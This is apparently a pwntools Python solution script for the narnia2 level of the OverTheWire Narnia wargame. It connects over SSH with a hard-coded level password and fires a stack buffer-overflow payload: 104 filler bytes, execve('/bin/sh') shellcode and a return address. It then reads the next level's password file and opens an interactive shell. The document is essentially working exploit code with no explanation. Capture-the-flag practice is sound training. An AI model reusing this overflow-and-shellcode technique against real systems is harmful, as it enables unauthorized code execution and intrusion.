from pwn import *

user ='narnia2'
host = 'narnia.labs.overthewire.org'
password = 'nairiepecu'
port=2226

sled = r'+"\x90\xd8\xff\xff"'
shellcode = r'"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'
payload = "/narnia/./narnia2 "
payload += "$(python -c 'print "+'"A"' + "*104"
payload += "+" + shellcode
payload += sled + "')"

machine = ssh(user=user, host=host, password=password, port=port)

bin = machine.shell("bash")
bin.sendline(payload)
bin.sendline('cat /etc/narnia*/narnia3')
bin.interactive()
